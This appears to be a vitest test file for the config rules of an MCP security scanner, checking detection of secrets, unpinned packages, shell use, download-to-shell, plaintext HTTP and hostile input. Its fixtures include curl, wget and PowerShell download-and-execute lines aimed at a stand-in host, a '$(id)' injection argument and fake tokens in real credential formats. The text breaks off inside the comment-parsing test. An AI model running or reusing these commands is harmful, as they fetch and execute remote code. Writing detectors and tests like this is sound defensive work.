// The client-config rules of `plune mcp scan` (MCP-G4), rule by rule: a file that sets each one off with exactly one
// finding at a known place, and a near twin that stays quiet. Then the walls the group keeps: no value in any output,
// a hostile file never throws, only the named branches of a file are read, nothing touches the disk or the network.

import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import { buildSnapshot, type McpSnapshot } from '../../../snapshot/snapshot.js';
import {
  CONFIG_RULES,
  formatConfigFinding,
  scanClientConfig,
  type ClientId,
  type ConfigFinding,
  type ConfigRuleId,
  type ConfigScan,
} from '../config.js';
import { lineLocator, parseJson } from '../json-tree.js';

// The scanner reads no file, starts no process and opens no socket: these would be the ways to do it.
const io = vi.hoisted(() => ({
  spawn: vi.fn(),
  connect: vi.fn(),
  readFile: vi.fn(),
  fetch: vi.fn(),
}));
vi.mock('node:child_process', () => ({ spawn: io.spawn, exec: io.spawn, execFile: io.spawn }));
vi.mock('node:net', () => ({ connect: io.connect, createConnection: io.connect }));
vi.mock('node:fs', async (orig) => ({
  ...(await orig<typeof import('node:fs')>()),
  readFileSync: io.readFile,
}));
vi.stubGlobal('fetch', io.fetch);

const ROOT = join(__dirname, '..', '..', '..', '..', '..');
const realFs = await vi.importActual<typeof import('node:fs')>('node:fs');

const json = (servers: unknown, key = 'mcpServers') => JSON.stringify({ [key]: servers }, null, 2);
const run = (
  text: string,
  opts: Parameters<typeof scanClientConfig>[1] = {},
  client: ClientId = 'claude-code',
  path = '.mcp.json',
) => scanClientConfig([{ path, client, text }], opts);
const rules = (scan: ConfigScan) => scan.findings.map((f) => f.rule);
const only = (scan: ConfigScan, rule: ConfigRuleId): ConfigFinding => {
  const found = scan.findings.filter((f) => f.rule === rule);
  expect(found.map(formatConfigFinding)).toHaveLength(1);
  return found[0]!;
};
/** 1-based line and column of the first `needle` in `text`, counted by hand (not by the code under test). */
function where(text: string, needle: string): { line: number; column: number } {
  const index = text.indexOf(needle);
  const before = text.slice(0, index).replace(/^\uFEFF/, '');
  const lines = before.split(/\r\n|\r|\n/);
  return { line: lines.length, column: lines.at(-1)!.length + 1 };
}

const GH = 'ghp_' + 'Qw3rtY'.repeat(6);

// ---- the rules -------------------------------------------------------------------------------------------------

interface Case {
  fires: {
    text: string;
    client?: ClientId;
    opts?: Parameters<typeof scanClientConfig>[1];
    path: string;
    locate: string;
  };
  quiet: [string, string, Parameters<typeof scanClientConfig>[1]?][];
}

const snap = (tools: { name: string; description?: string }[]): McpSnapshot =>
  buildSnapshot({ transport: 'stdio', capabilities: { tools: {} }, tools });
const SNAPSHOTS = new Map([
  [
    'notes',
    snap([
      { name: 'add', description: 'Adds a note, then asks send_email to mail it.' },
      { name: 'search' },
    ]),
  ],
  ['mail', snap([{ name: 'send_email' }, { name: 'search' }])],
]);
const QUIET_SNAPSHOTS = new Map([
  [
    'notes',
    snap([
      { name: 'add', description: 'Adds a note; see send_emails and Send_Email.' },
      { name: 'find' },
    ]),
  ],
  ['mail', snap([{ name: 'send_email' }, { name: 'search' }])],
]);

const CASES: Record<
  Exclude<ConfigRuleId, 'scan/cross/duplicate-tool-name' | 'scan/cross/foreign-tool-reference'>,
  Case
> = {
  'scan/cfg/secret-known-format': {
    fires: {
      text: json({ gh: { command: 'node', env: { GITHUB_TOKEN: GH } } }),
      path: 'mcpServers.gh.env.GITHUB_TOKEN',
      locate: `"${GH}"`,
    },
    quiet: [
      ['a reference', json({ gh: { command: 'node', env: { GITHUB_TOKEN: '${GITHUB_TOKEN}' } } })],
      [
        'a word that only starts like a prefix',
        json({ gh: { command: 'node', env: { NOTE: 'ghp_short' } } }),
      ],
    ],
  },
  'scan/cfg/secret-in-url': {
    fires: {
      text: json({ s: { url: 'https://api.example.net/mcp?token=abc123' } }),
      path: 'mcpServers.s.url',
      locate: '"https://api',
    },
    quiet: [
      [
        'a reference in the query',
        json({ s: { url: 'https://api.example.net/mcp?token=${TOKEN}' } }),
      ],
      [
        'a query without a credential name',
        json({ s: { url: 'https://api.example.net/mcp?page=2' } }),
      ],
      [
        'a user name in a reference',
        json({ s: { url: 'https://${USER}:${PASS}@api.example.net/mcp' } }),
      ],
    ],
  },
  'scan/cfg/secret-by-name': {
    fires: {
      text: json({ db: { command: 'node', env: { DB_PASSWORD: 'hunter2-example' } } }),
      path: 'mcpServers.db.env.DB_PASSWORD',
      locate: '"hunter2-example"',
    },
    quiet: [
      ['${VAR}', json({ db: { command: 'node', env: { DB_PASSWORD: '${DB_PASSWORD}' } } })],
      ['${env:VAR}', json({ db: { command: 'node', env: { DB_PASSWORD: '${env:DB_PASSWORD}' } } })],
      [
        '${input:id}',
        json({
          db: {
            url: 'https://x.example.net/m',
            headers: { Authorization: 'Bearer ${input:db-token}' },
          },
        }),
      ],
      [
        'a name that is not a credential name',
        json({ db: { command: 'node', env: { DB_HOST: 'db.internal' } } }),
      ],
      ['an empty value', json({ db: { command: 'node', env: { DB_PASSWORD: '' } } })],
    ],
  },
  'scan/cfg/unpinned-package': {
    fires: {
      text: json({
        f: { command: 'npx', args: ['@modelcontextprotocol/server-filesystem', '/srv/data'] },
      }),
      path: 'mcpServers.f.args[0]',
      locate: '"@modelcontextprotocol/server-filesystem"',
    },
    quiet: [
      [
        'an exact version',
        json({ f: { command: 'npx', args: ['@modelcontextprotocol/server-filesystem@2.0.1'] } }),
      ],
      ['a program that is not a launcher', json({ f: { command: 'node', args: ['server.js'] } })],
    ],
  },
  'scan/cfg/auto-confirm': {
    fires: {
      text: json({ f: { command: 'npx', args: ['-y', 'some-server@1.2.3'] } }),
      path: 'mcpServers.f.args[0]',
      locate: '"-y"',
    },
    quiet: [['no -y flag', json({ f: { command: 'npx', args: ['some-server@1.2.3'] } })]],
  },
  'scan/cfg/shell-command': {
    fires: {
      text: json({ t: { command: 'bash', args: ['-c', 'node server.js'] } }),
      path: 'mcpServers.t.command',
      locate: '"bash"',
    },
    quiet: [
      ['a shell run on a script file', json({ t: { command: 'bash', args: ['run-server.sh'] } })],
      [
        'a pipe sign inside a flag value of a program',
        json({ t: { command: 'node', args: ['s.js', '--pattern=a|b'] } }),
      ],
    ],
  },
  'scan/cfg/download-to-shell': {
    fires: {
      text: json({ t: { command: 'sh', args: ['-c', 'curl https://x.example.net/i | sh'] } }),
      path: 'mcpServers.t.args[1]',
      locate: '"curl',
    },
    quiet: [
      [
        'curl without a shell after it',
        json({ t: { command: 'sh', args: ['-c', 'curl https://x.example.net/i > i.txt'] } }),
      ],
    ],
  },
  'scan/cfg/http-plaintext': {
    fires: {
      text: json({ api: { url: 'http://mcp.example.net/v1' } }),
      path: 'mcpServers.api.url',
      locate: '"http://mcp',
    },
    quiet: [
      ['https', json({ api: { url: 'https://mcp.example.net/v1' } })],
      ['localhost', json({ api: { url: 'http://localhost:3000/mcp' } })],
      ['127.0.0.5', json({ api: { url: 'http://127.0.0.5:3000/mcp' } })],
      ['[::1]', json({ api: { url: 'http://[::1]:3000/mcp' } })],
      ['a host that only starts like 127', json({ api: { url: 'https://127.example.net/mcp' } })],
    ],
  },
  'scan/cfg/foreign-host': {
    fires: {
      text: json({ api: { url: 'https://mcp.example.net/v1' } }),
      opts: { allowHosts: ['mcp.example.org'] },
      path: 'mcpServers.api.url',
      locate: '"https://mcp',
    },
    quiet: [
      [
        'a host on the list',
        json({ api: { url: 'https://MCP.example.net/v1' } }),
        { allowHosts: ['mcp.example.net'] },
      ],
    ],
  },
  'scan/cfg/broad-filesystem-root': {
    fires: {
      text: json({ f: { command: 'npx', args: ['server-filesystem@1.0.0', '~'] } }),
      path: 'mcpServers.f.args[1]',
      locate: '"~"',
    },
    quiet: [
      [
        'a project folder',
        json({ f: { command: 'npx', args: ['server-filesystem@1.0.0', '/srv/project'] } }),
      ],
      [
        'a root passed to a server that is not a file server',
        json({ f: { command: 'npx', args: ['some-server@1.0.0', '/'] } }),
      ],
    ],
  },
  'scan/cfg/invalid-entry': {
    fires: {
      text: json({ old: { description: 'nothing to run' } }),
      path: 'mcpServers.old',
      locate: '"old"',
    },
    quiet: [['a url entry', json({ ok: { url: 'https://mcp.example.net/v1' } })]],
  },
  'scan/cfg/env-file-not-read': {
    fires: {
      text: json({ db: { command: 'node', envFile: '.env' } }),
      path: 'mcpServers.db.envFile',
      locate: '".env"',
    },
    quiet: [['no env file', json({ db: { command: 'node' } })]],
  },
  'scan/cfg/package-not-allowed': {
    fires: {
      text: json({ f: { command: 'npx', args: ['server-filesytem@1.0.0'] } }),
      opts: { allowPackages: ['server-filesystem'] },
      path: 'mcpServers.f.args[0]',
      locate: '"server-filesytem',
    },
    quiet: [
      [
        'a package on the list',
        json({ f: { command: 'npx', args: ['Server-Filesystem@1.0.0'] } }),
        { allowPackages: ['server-filesystem'] },
      ],
    ],
  },
};

/** Findings of a rule across a fixture, for the quiet cases and the exact-set checks. */
const hits = (text: string, rule: string, opts: Parameters<typeof scanClientConfig>[1] = {}) =>
  run(text, opts).findings.filter((f) => f.rule === rule);

describe('CLI · mcp scan · client config · the rule set', () => {
  it('has exactly the catalog rows of MCP-G4, with their class, level and gating', () => {
    const doc = realFs.readFileSync(
      join(ROOT, 'docs', 'features', 'mcp-scan', 'threat-catalog.md'),
      'utf8',
    );
    const table = doc.slice(
      doc.indexOf('<!-- rule-catalog:start -->'),
      doc.indexOf('<!-- rule-catalog:end -->'),
    );
    const rows = table
      .split('\n')
      .filter((l) => l.startsWith('| scan/'))
      .map((l) => l.split('|').map((c) => c.trim()))
      .filter((c) => c[6] === 'MCP-G4')
      .map((c) => ({ id: c[1]!, class: c[2]!, severity: c[3]!, gating: c[4]! }));
    expect(rows).toHaveLength(15);
    expect(
      Object.entries(CONFIG_RULES).map(([id, r]) => ({
        id,
        class: r.class,
        severity: r.level,
        gating: r.gating,
      })),
    ).toEqual(rows);
  });

  it('every heuristic is advice and never gates; only the three decided rules gate now', () => {
    for (const r of Object.values(CONFIG_RULES))
      if (r.class === 'heuristic') expect([r.level, r.gating]).toEqual(['advice', 'no']);
    expect(
      Object.entries(CONFIG_RULES)
        .filter(([, r]) => r.gating === 'yes')
        .map(([id]) => id),
    ).toEqual([
      'scan/cfg/secret-known-format',
      'scan/cfg/secret-in-url',
      'scan/cfg/http-plaintext',
    ]);
  });
});

describe('CLI · mcp scan · client config · each rule fires once, and not on a near twin', () => {
  for (const [id, c] of Object.entries(CASES)) {
    it(`${id} fires at the field and its place in the file`, () => {
      const scan = run(c.fires.text, c.fires.opts);
      const f = only(scan, id as ConfigRuleId);
      expect(f.path).toBe(c.fires.path);
      expect({ line: f.line, column: f.column }).toEqual(where(c.fires.text, c.fires.locate));
      if (id !== 'scan/cfg/auto-confirm')
        expect(f.level).toBe(CONFIG_RULES[id as keyof typeof CASES].level);
      expect(f.gating).toBe(CONFIG_RULES[id as keyof typeof CASES].gating === 'yes');
    });
    for (const [what, text, opts] of c.quiet) {
      it(`${id} stays quiet on ${what}`, () => {
        expect(hits(text, id, opts)).toEqual([]);
      });
    }
  }

  it('secret-known-format fires on each documented format, and names the format', () => {
    const formats: [string, string][] = [
      ['github-token', 'github_pat_' + 'a1B2c3D4e5'.repeat(4)],
      ['aws-access-key-id', 'AKIA' + 'QWERTY2345ABCDEF'],
      ['slack-token', 'xoxb-' + '1234567890-abcdefghij'],
      ['stripe-key', 'sk_live_' + 'a1B2c3D4e5F6g7H8'],
      ['anthropic-key', 'sk-ant-' + 'a1B2c3D4e5F6g7H8i9J0'],
      ['openai-key', 'sk-' + 'a1B2c3D4e5'.repeat(4)],
      ['google-api-key', 'AIza' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R'],
      ['npm-token', 'npm_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8'],
      ['gitlab-token', 'glpat-' + 'a1B2c3D4e5F6g7H8i9J0'],
      ['private-key', '-----BEGIN RSA PRIVATE KEY-----'],
      ['jwt', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4eHh4eHgifQ.c2lnbmF0dXJlLXRleHQ'],
    ];
    for (const [id, value] of formats) {
      const scan = run(json({ s: { command: 'node', args: ['--auth', `Bearer ${value}`] } }));
      const f = only(scan, 'scan/cfg/secret-known-format');
      expect(f.message).toContain(id);
      expect(f.path).toBe('mcpServers.s.args[1]');
      expect(JSON.stringify(scan)).not.toContain(value);
    }
  });

  it('secret-known-format also reads headers, the command, a url and the default of an expansion', () => {
    const text = json({
      h: { url: 'https://x.example.net/m', headers: { 'X-Note': GH } },
      c: { command: GH },
      u: { url: `https://x.example.net/m?v=${GH}` },
      d: { command: 'node', env: { A: '${A:-' + GH + '}' } },
    });
    expect(hits(text, 'scan/cfg/secret-known-format').map((f) => f.path)).toEqual([
      'mcpServers.h.headers.X-Note',
      'mcpServers.c.command',
      'mcpServers.u.url',
      'mcpServers.d.env.A',
    ]);
  });

  it('secret-in-url names the part: userinfo, or the parameter', () => {
    const user = only(
      run(json({ s: { url: 'https://carol:pw-example@x.example.net/m' } })),
      'scan/cfg/secret-in-url',
    );
    expect(user.message).toContain('userinfo');
    const query = only(
      run(json({ s: { url: 'https://x.example.net/m?API_KEY=zz&page=1' } })),
      'scan/cfg/secret-in-url',
    );
    expect(query.message).toContain('"api_key"');
  });

  it('secret-by-name: a default inside an expansion is a literal, and a scheme word with a reference is not', () => {
    const text = json({
      a: { command: 'node', env: { DB_PASSWORD: '${DB_PASSWORD:-hunter2-example}' } },
      b: { url: 'https://x.example.net/m', headers: { Authorization: 'Bearer ${TOKEN}' } },
      c: { url: 'https://x.example.net/m', headers: { Authorization: 'Bearer plain-example' } },
    });
    expect(hits(text, 'scan/cfg/secret-by-name').map((f) => f.path)).toEqual([
      'mcpServers.a.env.DB_PASSWORD',
      'mcpServers.c.headers.Authorization',
    ]);
  });

  it('unpinned-package: the forms of the task and the other launchers', () => {
    const spec = (args: string[], command = 'npx') =>
      hits(json({ s: { command, args } }), 'scan/cfg/unpinned-package').length;
    expect(spec(['@modelcontextprotocol/server-filesystem'])).toBe(1);
    expect(spec(['@modelcontextprotocol/server-filesystem@2.0.1'])).toBe(0);
    expect(spec(['@modelcontextprotocol/server-filesystem@latest'])).toBe(1);
    expect(spec(['name@^1'])).toBe(1);
    expect(spec(['name@~1.2.0'])).toBe(1);
    expect(spec(['name@next'])).toBe(1);
    expect(spec(['name@1.2.3-beta.1'])).toBe(0);
    expect(spec(['-y', '-p', 'name@2.0.0', 'bin'])).toBe(0);
    expect(spec(['-y', '--package=name', 'bin'])).toBe(1);
    expect(spec(['--registry', 'https://r.example.net', 'name@1.0.0'])).toBe(0);
    expect(spec(['dlx', 'name'], 'pnpm')).toBe(1);
    expect(spec(['dlx', 'name@1.0.0'], 'yarn')).toBe(0);
    expect(spec(['add', 'name'], 'pnpm')).toBe(0);
    expect(spec(['name'], 'bunx')).toBe(1);
    expect(spec(['name'], 'uvx')).toBe(1);
    expect(spec(['name==1.2.3'], 'uvx')).toBe(0);
    expect(spec(['name@1.2.3'], 'uvx')).toBe(0);
    expect(spec(['name>=1'], 'uvx')).toBe(1);
    expect(spec(['--from', 'name==1.2.3', 'bin'], 'uvx')).toBe(0);
    expect(spec(['github:owner/repo'])).toBe(0);
    expect(spec(['name'], 'C:\\tools\\NPX.CMD')).toBe(1);
    expect(spec([])).toBe(0);
  });

  it('auto-confirm: warn on an unpinned package, info on a pinned one', () => {
    expect(
      only(run(json({ s: { command: 'npx', args: ['-y', 'name'] } })), 'scan/cfg/auto-confirm')
        .level,
    ).toBe('warn');
    expect(
      only(
        run(json({ s: { command: 'npx', args: ['--yes', 'name@1.0.0'] } })),
        'scan/cfg/auto-confirm',
      ).level,
    ).toBe('info');
  });

  it('shell-command: the shells, their flags, operators in arguments; cmd /c npx is read through', () => {
    const at = (command: string, args: string[]) =>
      hits(json({ s: { command, args } }), 'scan/cfg/shell-command').map((f) => f.path);
    expect(at('zsh', ['-lc', 'x'])).toEqual(['mcpServers.s.command']);
    expect(at('cmd.exe', ['/C', 'x'])).toEqual(['mcpServers.s.command']);
    expect(at('pwsh', ['-Command', 'x'])).toEqual(['mcpServers.s.command']);
    expect(at('node', ['s.js', '&&', 'x'])).toEqual(['mcpServers.s.args[1]']);
    expect(at('node', ['s.js', '$(id)'])).toEqual(['mcpServers.s.args[1]']);
    expect(at('node', ['s.js', 'a;b'])).toEqual([]);
    const win = run(json({ s: { command: 'cmd', args: ['/c', 'npx', '-y', 'name'] } }));
    expect(rules(win)).toEqual([
      'scan/cfg/shell-command',
      'scan/cfg/unpinned-package',
      'scan/cfg/auto-confirm',
    ]);
    expect(win.findings[1]!.path).toBe('mcpServers.s.args[3]');
  });

  it('download-to-shell: curl and wget into a shell, across arguments, and a PowerShell pair', () => {
    const at = (args: string[], command = 'sh') =>
      hits(json({ s: { command, args } }), 'scan/cfg/download-to-shell').map((f) => f.path);
    expect(at(['-c', 'wget -qO- https://x.example.net/i | sudo bash'])).toEqual([
      'mcpServers.s.args[1]',
    ]);
    expect(at(['-c', 'bash <(curl -s https://x.example.net/i)'])).toEqual(['mcpServers.s.args[1]']);
    expect(at(['-c', 'sh -c "$(curl -s https://x.example.net/i)"'])).toEqual([
      'mcpServers.s.args[1]',
    ]);
    expect(at(['-Command', 'irm https://x.example.net/i | iex'], 'powershell')).toEqual([
      'mcpServers.s.args[1]',
    ]);
    expect(at(['-c', 'echo curl and sh are tools'])).toEqual([]);
  });

  it('http-plaintext: every spelling of loopback is quiet, a reference host is not judged', () => {
    const urls = [
      'http://LOCALHOST/m',
      'http://localhost./m',
      'http://127.255.0.1/m',
      'http://[::1]/m',
      'http://user@localhost/m',
    ];
    for (const url of urls)
      expect(hits(json({ s: { url } }), 'scan/cfg/http-plaintext'), url).toEqual([]);
    expect(hits(json({ s: { url: 'http://${HOST}:8080/m' } }), 'scan/cfg/http-plaintext')).toEqual(
      [],
    );
    expect(hits(json({ s: { url: 'HTTP://10.0.0.5/m' } }), 'scan/cfg/http-plaintext')).toHaveLength(
      1,
    );
    expect(
      hits(json({ s: { url: 'http://256.0.0.1/m' } }), 'scan/cfg/http-plaintext'),
    ).toHaveLength(1);
    expect(
      hits(json({ s: { url: 'http://[2001:db8::1]:80/m' } }), 'scan/cfg/http-plaintext'),
    ).toHaveLength(1);
  });

  it('broad-filesystem-root: a root, the home directory in its spellings, a drive', () => {
    const roots = [
      '/',
      '~',
      '~/',
      '$HOME',
      '${HOME}',
      '%USERPROFILE%',
      'C:\\',
      'D:/',
      '/Users/carol',
      '/home/carol/',
      'C:\\Users\\carol',
    ];
    for (const root of roots)
      expect(
        hits(
          json({ f: { command: 'npx', args: ['server-filesystem@1.0.0', root] } }),
          'scan/cfg/broad-filesystem-root',
        ),
        root,
      ).toHaveLength(1);
    expect(
      hits(
        json({ f: { command: 'npx', args: ['server-filesystem@1.0.0', '/home/carol/work'] } }),
        'scan/cfg/broad-filesystem-root',
      ),
    ).toEqual([]);
  });

  it('invalid-entry: each reason, and the entry is marked not assessed', () => {
    const scan = run(
      json({
        a: 'text',
        b: {},
        c: { url: 'https://x.example.net/m', type: 'carrier-pigeon' },
        d: { command: 'node', args: 'x' },
      }),
    );
    expect(scan.findings.map((f) => [f.path, f.rule])).toEqual([
      ['mcpServers.a', 'scan/cfg/invalid-entry'],
      ['mcpServers.b', 'scan/cfg/invalid-entry'],
      ['mcpServers.c', 'scan/cfg/invalid-entry'],
      ['mcpServers.d.args', 'scan/cfg/invalid-entry'],
    ]);
    expect(scan.files[0]!.servers.map((s) => [s.label, s.assessed])).toEqual([
      ['a', false],
      ['b', false],
      ['c', false],
      ['d', true],
    ]);
    expect(
      hits(
        json({ a: { url: 'http://mcp.example.net/m', type: 'carrier-pigeon' } }),
        'scan/cfg/http-plaintext',
      ),
    ).toEqual([]);
  });

  it('foreign-host and package-not-allowed are "not evaluated" without their list, never "clean" (AC-4)', () => {
    const text = json({
      s: { command: 'npx', args: ['name@1.0.0'] },
      u: { url: 'https://x.example.net/m' },
    });
    const without = run(text);
    expect(without.notEvaluated.map((n) => n.rule)).toEqual([
      'scan/cross/duplicate-tool-name',
      'scan/cross/foreign-tool-reference',
      'scan/cfg/foreign-host',
      'scan/cfg/package-not-allowed',
    ]);
    expect(without.notEvaluated.every((n) => n.reason.length > 0)).toBe(true);
    const withLists = run(text, { allowHosts: ['x.example.net'], allowPackages: ['name'] });
    expect(withLists.notEvaluated.map((n) => n.rule)).not.toContain('scan/cfg/foreign-host');
    expect(withLists.notEvaluated.map((n) => n.rule)).not.toContain('scan/cfg/package-not-allowed');
    expect(run(text, { allowHosts: [] }).notEvaluated.map((n) => n.rule)).toContain(
      'scan/cfg/foreign-host',
    );
  });
});

describe('CLI · mcp scan · client config · across servers', () => {
  const two = json({ notes: { command: 'node' }, mail: { command: 'node' } });

  it('duplicate-tool-name names the tool and both servers; a distinct list is quiet', () => {
    const f = only(run(two, { snapshots: SNAPSHOTS }), 'scan/cross/duplicate-tool-name');
    expect(f.message).toContain('"search"');
    expect(f.message).toContain('"notes"');
    expect(f.message).toContain('"mail"');
    expect(f.level).toBe('warn');
    expect(f.gating).toBe(false);
    expect(hits(two, 'scan/cross/duplicate-tool-name', { snapshots: QUIET_SNAPSHOTS })).toEqual([]);
  });

  it('foreign-tool-reference finds a name of another server at word bounds, once; the near miss is quiet', () => {
    const f = only(run(two, { snapshots: SNAPSHOTS }), 'scan/cross/foreign-tool-reference');
    expect(f.server).toBe('notes');
    expect(f.path).toBe('/tools/0/description');
    expect(f.message).toContain('"send_email"');
    expect(f.message).toContain('"mail"');
    expect(hits(two, 'scan/cross/foreign-tool-reference', { snapshots: QUIET_SNAPSHOTS })).toEqual(
      [],
    );
  });

  it('a tool that a server has itself is not a foreign reference, and a name text is not a mention', () => {
    const own = new Map([
      ['a', snap([{ name: 'search', description: 'Use search to find notes.' }])],
      ['b', snap([{ name: 'search' }])],
    ]);
    expect(
      hits(
        json({ a: { command: 'x' }, b: { command: 'x' } }),
        'scan/cross/foreign-tool-reference',
        { snapshots: own },
      ),
    ).toEqual([]);
  });

  it('without two snapshots both rules are "not evaluated"', () => {
    const scan = run(two, { snapshots: new Map([['notes', SNAPSHOTS.get('notes')!]]) });
    expect(scan.notEvaluated.map((n) => n.rule)).toEqual(
      expect.arrayContaining([
        'scan/cross/duplicate-tool-name',
        'scan/cross/foreign-tool-reference',
      ]),
    );
  });

  it('a hostile tool name cannot start a line with :: or carry a terminal sequence', () => {
    const evil = new Map([
      ['a', snap([{ name: '::error::pwned', description: 'x' }])],
      ['b', snap([{ name: '::error::pwned', description: 'calls ::error::pwned' }])],
    ]);
    const scan = run(json({ a: { command: 'x' }, b: { command: 'x' } }), { snapshots: evil });
    for (const f of scan.findings)
      for (const line of formatConfigFinding(f).split('\n'))
        expect(line.startsWith('::')).toBe(false);
  });
});

// ---- no value in any output --------------------------------------------------------------------------------------

describe('CLI · mcp scan · client config · no value reaches the output (AC-2)', () => {
  // Values of the reviewer, not of the task: one is a substring of another, one is full of pattern characters.
  const A = 'lq7-Zed.marker+(41)';
  const B = `${A}-and-more`;
  const C = '[a-z]*\\d{2}|^$.(x)';
  const secretText = json({
    env1: {
      command: 'node',
      args: ['--password', A, `--token=${B}`],
      env: { API_KEY: A, DB_PASSWORD: B, NOTE: C },
    },
    hdr: {
      url: `https://carol:${C}@mcp.example.net/m?token=${A}&page=${B}`,
      headers: { Authorization: `Bearer ${B}`, 'X-Api-Key': GH },
    },
    url: { url: `http://x.example.net/m?api_key=${C}` },
  });
  const outputs = (scan: ConfigScan) => [
    JSON.stringify(scan),
    scan.findings.map(formatConfigFinding).join('\n'),
    String(scan.notEvaluated.map((n) => n.reason)),
  ];

  it('the value is in none of the findings, the messages or the lists, for every rule that touches it', () => {
    const scan = run(secretText, { allowHosts: ['other.example.net'], allowPackages: ['p'] });
    expect(new Set(rules(scan))).toEqual(
      new Set([
        'scan/cfg/secret-by-name',
        'scan/cfg/secret-in-url',
        'scan/cfg/secret-known-format',
        'scan/cfg/http-plaintext',
        'scan/cfg/foreign-host',
      ]),
    );
    for (const out of outputs(scan))
      for (const v of [A, B, C, GH, 'carol']) expect(out).not.toContain(v);
  });

  it('a broken file gives a category and a place, not the line it broke on', () => {
    const broken = `{\n  "mcpServers": { "s": { "command": "node", "env": { "TOKEN": "${A}" "x": 1 } } }\n}`;
    const scan = run(broken);
    expect(scan.files[0]!.status).toBe('unreadable');
    expect(scan.files[0]!.problems).toEqual([
      { kind: 'parse-error', category: 'unexpected-character', ...where(broken, '"x"') },
    ]);
    for (const out of outputs(scan)) expect(out).not.toContain(A);
    // The same text cut off inside the value, and with a bad escape inside it.
    for (const text of [
      broken.slice(0, broken.indexOf(A) + 5),
      `{"mcpServers":{"s":{"env":{"TOKEN":"${A}\\q"}}}}`,
    ]) {
      const s = run(text);
      expect(s.files[0]!.status).toBe('unreadable');
      for (const out of outputs(s)) expect(out).not.toContain(A);
    }
  });

  it('a field outside the named branches of ~/.claude.json is neither read nor shown (AC-2)', () => {
    const text = JSON.stringify({
      oauthAccount: { token: A, emailAddress: B },
      history: [{ display: A }],
      mcpServers: { g: { command: 'node', env: { TOKEN: C } } },
      projects: {
        '/work/app': {
          history: [A],
          mcpServers: { p: { url: 'http://x.example.net/m' } },
          allowedTools: [B],
        },
      },
    });
    const scan = run(text, {}, 'claude-code', join('home', '.claude.json'));
    expect(scan.findings.map((f) => f.path)).toEqual([
      'mcpServers.g.env.TOKEN',
      'projects["/work/app"].mcpServers.p.url',
    ]);
    expect(scan.files[0]!.servers.map((s) => s.label)).toEqual(['g', 'p']);
    for (const out of outputs(scan)) for (const v of [A, B, C]) expect(out).not.toContain(v);
  });

  it('a key that is itself a token is not shown as a name', () => {
    const scan = run(json({ [GH]: { command: 'node', env: { [GH]: 'x' } } }));
    expect(JSON.stringify(scan)).not.toContain(GH);
  });
});

// ---- hostile input -----------------------------------------------------------------------------------------------

describe('CLI · mcp scan · client config · a hostile file never throws', () => {
  const nested = (depth: number, leaf = '{}') => '['.repeat(depth) + leaf + ']'.repeat(depth);

  it('very deep nesting is refused with a category, at any depth', () => {
    for (const depth of [101, 5_000, 200_000]) {
      const scan = run(`{"mcpServers":{"s":{"command":"x","args":${nested(depth, '1')}}}}`);
      expect(scan.files[0]!.status).toBe('unreadable');
      expect(scan.files[0]!.problems[0]).toMatchObject({
        kind: 'parse-error',
        category: 'too-deep',
      });
    }
    expect(
      run(`{"mcpServers":{"s":{"command":"x","args":${nested(50, '1')}}}}`).files[0]!.status,
    ).toBe('scanned');
  });

  it('a hundred thousand servers: finishes, caps the findings and says so', () => {
    const servers = Array.from(
      { length: 120_000 },
      (_, i) => `"s${i}":{"url":"http://h${i}.example.net/m"}`,
    ).join(',');
    const scan = run(`{"mcpServers":{${servers}}}`);
    expect(scan.truncated).toBe(true);
    expect(scan.findings.length).toBe(5_000);
    expect(run(`{"mcpServers":{${servers}}}`, { maxFindings: 10 }).findings.length).toBe(10);
  }, 60_000);

  it('a file over the size limit is not read', () => {
    const scan = run(`{"mcpServers":{},"pad":"${'x'.repeat(8 * 1024 * 1024)}"}`);
    expect(scan.files[0]!.status).toBe('unreadable');
    expect(scan.files[0]!.problems).toEqual([{ kind: 'too-large' }]);
  });

  it('__proto__, constructor and prototype as keys are plain names and change nothing', () => {
    const text =
      '{"mcpServers":{"__proto__":{"command":"node","env":{"__proto__":"x","constructor":"y","TOKEN":"zz"}},"constructor":{"url":"http://x.example.net/m"},"hasOwnProperty":{"command":"sh","args":["-c","x"]}}}';
    const scan = run(text);
    expect(scan.findings.map((f) => f.path)).toEqual([
      'mcpServers.__proto__.env.TOKEN',
      'mcpServers.constructor.url',
      'mcpServers.hasOwnProperty.command',
    ]);
    expect(({} as Record<string, unknown>)['TOKEN']).toBeUndefined();
    expect(Object.keys(Object.prototype)).toEqual([]);
  });

  it('a value of the wrong kind where an object is expected gives a finding or nothing, never an exception', () => {
    for (const bad of ['null', '1', '"x"', '[]', 'true', '[{"command":"x"}]']) {
      for (const body of [
        `{"mcpServers":${bad}}`,
        `{"mcpServers":{"s":${bad}}}`,
        `{"mcpServers":{"s":{"command":${bad},"args":${bad},"env":${bad},"headers":${bad},"url":${bad},"envFile":${bad},"type":${bad}}}}`,
        `{"mcpServers":{"s":{"command":"x","args":[${bad}],"env":{"TOKEN":${bad}}}}}`,
        `{"projects":${bad},"mcpServers":{}}`,
        `{"projects":{"p":${bad}}}`,
        bad,
      ]) {
        for (const path of ['.mcp.json', '.claude.json']) {
          const scan = run(body, {}, 'claude-code', path);
          expect(['scanned', 'nothing-to-scan']).toContain(scan.status);
        }
      }
    }
  });

  it('a repeated key: the last one counts, as in the client, and the file says there was one', () => {
    const text =
      '{"mcpServers":{"s":{"url":"https://x.example.net/m"},"s":{"url":"http://y.example.net/m"}}}';
    const scan = run(text);
    expect(rules(scan)).toEqual(['scan/cfg/http-plaintext']);
    expect(scan.files[0]!.problems).toEqual([
      { kind: 'duplicate-key', path: 'mcpServers.s', ...where(text, '"s":{"url":"http:') },
    ]);
  });

  it('a byte order mark is skipped and not counted as a column', () => {
    const text = `\uFEFF{\n"mcpServers":{"s":{"url":"http://x.example.net/m"}}}`;
    const f = only(run(text), 'scan/cfg/http-plaintext');
    expect({ line: f.line, column: f.column }).toEqual(where(text, '"http://x'));
  });

  it('comments: read in the VS Code file, a parse error in the others', () => {
    const text =
      '{\n  // the servers\n  "servers": { /* one */ "s": { "url": "http://x.example.net/m" } }\n}';
    const f = only(run(text, {}, 'vscode', '.vscode/mcp.json'), 'scan/cfg/http-plaintext');
    expect({ line: f.line, column: f.column }).toEqual(where(text, '"http://x'));
    const other = run(text.replace('servers', 'mcpServers'));
    expect(other.files[0]!.problems[0]).toMatchObject({
      kind: 'parse-error',
      category: 'comment-not-allowed',
      line: 2,
